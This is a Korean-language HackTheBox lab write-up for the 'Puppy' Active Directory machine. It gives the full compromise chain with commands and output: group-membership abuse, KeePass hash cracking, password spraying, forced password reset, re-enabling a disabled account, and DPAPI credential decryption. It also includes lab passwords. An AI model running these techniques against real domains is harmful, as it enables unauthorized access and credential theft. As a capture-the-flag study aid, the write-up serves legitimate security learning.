# HTB-PUPPY
```bash
OS: Windows(AD)
DATE: 26.11.12
DIFFICULTY: Medium
```

## RECON
초기 정찰을 하기 전, 기본 크레덴셜 `levi.james / KingofAkron2025!`을 받고 시작했다. 이후 전체 포트 스캔 및 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49696,49709,49722 IP | tee nmap
```
전체 포트 검사 결과 88, 389 등이 열려 있는 것으로 보아 AD DC 서버인 것 같았다. 따라서 먼저 기본 크레덴셜로 SMB 열거부터 진행해보았다.
```bash
nxc smb IP -u levi.james -p KingofAkron2025! --shares

SMB         10.129.103.80   445    DC               Share           Permissions            Remark
SMB         10.129.103.80   445    DC               -----           -----------            ------
SMB         10.129.103.80   445    DC               ADMIN$                                 Remote Admin
SMB         10.129.103.80   445    DC               C$                                     Default share
SMB         10.129.103.80   445    DC               DEV                                    DEV-SHARE for PUPPY-DEVS
SMB         10.129.103.80   445    DC               IPC$            READ                   Remote IPC
SMB         10.129.103.80   445    DC               NETLOGON        READ                   Logon server share
SMB         10.129.103.80   445    DC               SYSVOL          READ                   Logon server share
```
그 결과 DEV 공유 폴더가 있지만 읽기 권한이 없어 접속이 불가능한 것을 알게 되었다. 이후 BloodHound로 조회해보았다.
```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d PUPPY.HTB -ns IP -c all
```
이후 levi.james 유저의 Outbound를 확인해보았다.

![blod](attach_real/Pasted%20image%2020261113141249.png)

확인 결과 대상 유저가 `DEVELOPERS` 그룹과 GenericWrite 관계인 것을 확인할 수 있었다.

## INITIAL ACCESS
이제 **DEVELOPERS** 그룹과 GenericWrite 관계인 것을 알게 되었으니, 이를 악용하여 대상 유저를 그룹에 추가해주었다.
```bash
net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "DC.PUPPY.HTB"
```
```bash
net rpc group members "DEVELOPERS" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "DC.PUPPY.HTB"
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```
확인 결과 그룹에 잘 등록되었다. 이제 DEV 그룹에 속하게 되었으니, 아까 접속하지 못했던 SMB DEV 폴더를 다시 한번 확인해보았다.
```bash
nxc smb PUPPY.HTB -u levi.james -p KingofAkron2025! --shares

SMB         10.129.103.80   445    DC               Share           Permissions            Remark
SMB         10.129.103.80   445    DC               -----           -----------            ------
SMB         10.129.103.80   445    DC               ADMIN$                                 Remote Admin
SMB         10.129.103.80   445    DC               C$                                     Default share
SMB         10.129.103.80   445    DC               DEV             READ                   DEV-SHARE for PUPPY-DEVS
SMB         10.129.103.80   445    DC               IPC$            READ                   Remote IPC
SMB         10.129.103.80   445    DC               NETLOGON        READ                   Logon server share
SMB         10.129.103.80   445    DC               SYSVOL          READ                   Logon server share
```
이번에는 READ 권한이 생긴 것을 확인할 수 있었다. 이제 smbclient를 활용하여 열거해보았다.
```bash
smbclient //PUPPY.HTB/DEV -U levi.james%KingofAkron2025!

smb > ls
  .                                  DR        0  Sun Mar 23 16:07:57 2025
  ..                                  D        0  Sun Mar  9 01:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 16:09:12 2025
  Projects                            D        0  Sun Mar  9 01:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 11:25:46 2025
```
SMB 파일들을 확인해본 결과 `recovery.kdbx` DB가 있는 것을 확인하고 로컬로 옮겨주었다.
```bash
smb > get recovery.kdbx
```
이후 암호화된 것을 풀기 위해 먼저 `keepass2john`을 활용하여 해시로 추출해주었다.
```bash
keepass2john recovery.kdbx > hash
```
이제 해시를 추출했으니 john을 이용하여 크랙해주었다.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
그 결과 DB의 평문 비밀번호를 얻을 수 있었다. 이제 `KeePassXC`라는 GUI 도구를 사용하여 DB에 접속해보았다. 접속 후 다섯 명의 유저가 있는 것을 확인했고, 각 유저 항목에 들어가 모든 유저의 평문 비밀번호를 얻을 수 있었다.

![db](attach_real/Pasted%20image%2020261113212812.png)

이제 유저마다 비밀번호를 모두 얻을 수 있었다.
```bash
adam : HJKL2025!
antony : Antman2025!
jami : JamieLove2025!
samuel : ILY2025!
steve : Steve2025!
```
이제 여기서 패스워드만 따로 빼서 PASS라는 워드리스트를 만들었고, nxc의 --users 옵션으로 도메인에 있는 유저들도 뽑아낸 후 users라는 워드리스트를 만들어주었다.
```bash
nxc smb puppy.htb -u levi.james -p KingofAkron2025! --users |  awk '$5 !~ /^\[/ && $5 != "-Username-" {print $5}' | tee users
```
이제 패스워드 스프레이를 이용하여 일치하는 유저가 있는지 확인해보았다.
```bash
nxc smb puppy.htb -u users -p PASS --continue-on-success

SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\jamie.williams:Antman2025! STATUS_LOGON_FAILURE
SMB         10.129.103.80   445    DC               [-] PUPPY.HTB\steph.cooper:Antman2025! STATUS_LOGON_FAILURE
```
그 결과 `ant.edwards` 유저의 크레덴셜을 얻을 수 있었다. 이제 다시 한번 BloodHound Outbound를 확인해보았다.

![blod2](attach_real/Pasted%20image%2020261113213330.png)

확인 결과 대상 유저가 ADAM.SILVER라는 유저와 GenericAll 관계라는 것을 알게 되어 패스워드를 변경해보았다.
```bash
bloodyAD --host DC.PUPPY.HTB --dc-ip IP -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' set password ADAM.SILVER 'password'

badldap.commons.exceptions.LDAPModifyException: New password doesn't match the complexity: The password must contains characters from three of the following categories: Uppercase, Lowercase, Digits, Special
Password can't be changed before -2 days, 23:58:40.715749 because of the minimum password age policy.
```
시도하였지만 오류가 발생했다. 알고 보니 패스워드 정책과 맞지 않는다는 것을 알게 되어 --pass-pol로 정책을 확인해보았다.
```bash
nxc smb IP -u ant.edwards -p Antman2025! --pass-pol

SMB         10.129.103.80   445    DC               Minimum password length: 7
SMB         10.129.103.80   445    DC               Password history length: 24
SMB         10.129.103.80   445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.129.103.80   445    DC
SMB         10.129.103.80   445    DC               Password Complexity Flags: 000001
SMB         10.129.103.80   445    DC                   Domain Refuse Password Change: 0
SMB         10.129.103.80   445    DC                   Domain Password Store Cleartext: 0
SMB         10.129.103.80   445    DC                   Domain Password Lockout Admins: 0
SMB         10.129.103.80   445    DC                   Domain Password No Clear Change: 0
SMB         10.129.103.80   445    DC                   Domain Password No Anon Change: 0
SMB         10.129.103.80   445    DC                   Domain Password Complex: 1
SMB         10.129.103.80   445    DC
SMB         10.129.103.80   445    DC               Minimum password age: 1 day 4 minutes
SMB         10.129.103.80   445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.129.103.80   445    DC               Locked Account Duration: 30 minutes
SMB         10.129.103.80   445    DC               Account Lockout Threshold: None
SMB         10.129.103.80   445    DC               Forced Log off Time: Not Set
```
확인 결과 최소 7자, 그리고 대/소문자·숫자·특수문자 중 3종류 이상이 필수라는 것을 알게 되었다. 따라서 다시 한번 시도하였다.
```bash
bloodyAD --host DC.PUPPY.HTB --dc-ip IP -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' set password ADAM.SILVER 'P@ssw0rd123'

[+] Password changed successfully!
```
이제 패스워드가 잘 변경되었다는 메시지가 떠서 nxc smb로 다시 한번 확인해보았다.
```bash
nxc smb IP -u ADAM.SILVER -p P@ssw0rd123

SMB IP 445 DC [-] PUPPY.HTB\ADAM.SILVER:P@ssw0rd123 STATUS_ACCOUNT_DISABLED
```
확인해본 결과 계정이 비활성화되어 있는 것을 알 수 있었다. 이는 비밀번호가 맞든 틀리든 인증 자체가 거부된다는 의미였다. 따라서 이 비활성화를 풀어야 접속할 수 있다는 것을 알게 되었고, 대상 유저에 대한 GenericAll 권한을 가지고 있었기 때문에 ACCOUNTDISABLE 비트를 꺼줄 수 있었다.
```bash
bloodyAD --host DC.PUPPY.HTB --dc-ip IP -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac ADAM.SILVER -f ACCOUNTDISABLE
```
이 명령어는 UAC 플래그 중 비활성화 플래그를 제거하는 명령어였다. 이후 다시 한번 확인해보았다.
```bash
nxc smb IP -u ADAM.SILVER -p P@ssw0rd123

PWN!
```
이번에는 정상적으로 접속할 수 있었고, 쉘에 접속하여 유저 플래그를 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261113215346.png)

## Privilege Escalation
이제 쉘을 얻고 열거를 진행한 결과, 최하위 폴더에 Backups라는 폴더가 있었다. 그 안에는 `site-backup-2024-12-30.zip`이라는 파일이 있어 로컬로 옮겨주었다.
```powershell
download C:\Backups\site-backup-2024-12-30.zip
```
```bash
unzip site-backup-2024-12-30.zip
```
압축을 풀어서 내부를 확인해보았다. 안에는 puppy라는 폴더에 웹사이트를 만든 흔적이 있었고, **nms-auth-config.xml.bak**이라는 백업 파일이 있어 내용을 확인해보았다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```
확인 결과 bind DN과 패스워드가 들어 있었다. 이제 다시 한번 아까 만든 유저 리스트로 패스워드 스프레이를 진행해보았다.
```bash
nxc smb IP -u users -p ChefSteph2025!

SMB IP 445 DC [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
```
그 결과 `steph.cooper`라는 유저의 평문 비밀번호를 얻을 수 있었다. 이후 쉘에 접속하여 권한 상승할 수 있는 경로를 많이 탐색하였지만 나오지 않았다. 그중 숨김 파일까지 한번에 열거하는 `Get-ChildItem -Recurse -Force` 명령어를 통해 Credentials 폴더와 Protect 폴더가 노출되어 있다는 것을 알게 되었다. 따라서 **DPAPI 마스터키 복호화**를 진행할 수 있다는 생각이 들었다. DPAPI란 Windows가 비밀번호·자격증명을 암호화해서 저장해주는 내장 시스템이다. 보통 브라우저에 저장된 비밀번호, 와이파이 비밀번호, 자격증명 관리자 등이 여기에 해당하며, 핵심 아이디어는 유저의 로그인 비밀번호로부터 암호화 키를 만들어내는 것이다. 여기서 DPAPI 자격증명을 풀려면 세 가지가 필요하다. 먼저 마스터키, 유저의 비밀번호와 SID, 그리고 자격증명 파일이다. 따라서 먼저 마스터키가 있는 `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>`에 접속해보았다.
```powershell
download C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
```
유저의 마스터키를 다운로드하고, 다음으로 크레덴셜 파일도 다운로드해주었다. 대상 파일은 `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\<GUID>` 위치에 있다.
```powershell
download C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```
이제 대상 파일들을 모두 로컬로 옮겼으니 복호화를 준비했다. 먼저 마스터키를 추출하려면 `마스터키 파일 + 비밀번호 + SID`가 필요하다.
```bash
impacket-dpapi masterkey -file master -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```
이후 자격증명 파일을 복호화하려면 `자격증명 파일 + 마스터키`가 필요하며, 그러면 숨겨진 비밀번호가 평문으로 추출된다.
```bash
impacket-dpapi credential -file credential -key '0x<위에서나온키>'

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```
이렇게 `steph.cooper_adm`, 즉 관리자 권한이 있는 유저의 계정을 얻게 되어 루트 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261113225621.png)

## New Inform
- 패스워드 정책에 복잡성(complexity) 요구사항이 있을 수 있다는 것을 명심하고 비밀번호를 변경하자
- complexity는 대문자·소문자·숫자·특수문자 중 3종류 이상을 필수로 요구함
- AD의 모든 계정 객체는 UAC(userAccountControl)라는 속성을 가진다. 이는 비트 플래그들의 합으로, 계정의 상태를 켜고 끄는 값들의 모음이다. 주요 플래그: ACCOUNTDISABLE(계정 비활성화), NORMAL_ACCOUNT(일반 사용자 계정)
- 만약 유저가 ACCOUNTDISABLE 상태라면, 해당 유저에 대한 GenericAll 같은 권한이 있을 경우 이를 해제해줄 수 있다
- 해제하는 방법: `bloodyAD --host DC.PUPPY.HTB --dc-ip IP -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac ADAM.SILVER -f ACCOUNTDISABLE`와 같이 remove uac 명령으로 해당 플래그를 제거해주면 된다
- 딱 봐도 수상한 것은 꼼꼼히 뒤져보자
- DPAPI = Data Protection API. Windows가 비밀번호·자격증명을 암호화해서 저장해주는 내장 시스템 (브라우저 비밀번호, Wi-Fi 비밀번호, 자격증명 관리자 등)
- DPAPI 자격증명 복호화에 필요한 것 3가지: 마스터키, 유저의 비밀번호+SID, 자격증명 파일. 마스터키 파일 = `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>`, 자격증명 파일 = `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\<GUID>`
- 숨김 파일까지 열거하려면 `Get-ChildItem -Recurse -Force` 명령어를 사용
- 복호화는 마스터키 파일을 먼저 복호화한 후, 그 키로 크레덴셜을 복호화하는 순서로 진행
- 유저 단위로 저장된 경우 AppData에 숨겨질 수 있지만, 시스템이 저장한 경우 `C:\Windows\System32\Microsoft\Protect\S-1-5-18\` 같은 곳에 저장됨
- 여기서 복호화한 것은 다른 유저를 푼 것이 아니라, 대상 유저(steph.cooper)의 어드민 계정 자격증명을 복호화한 것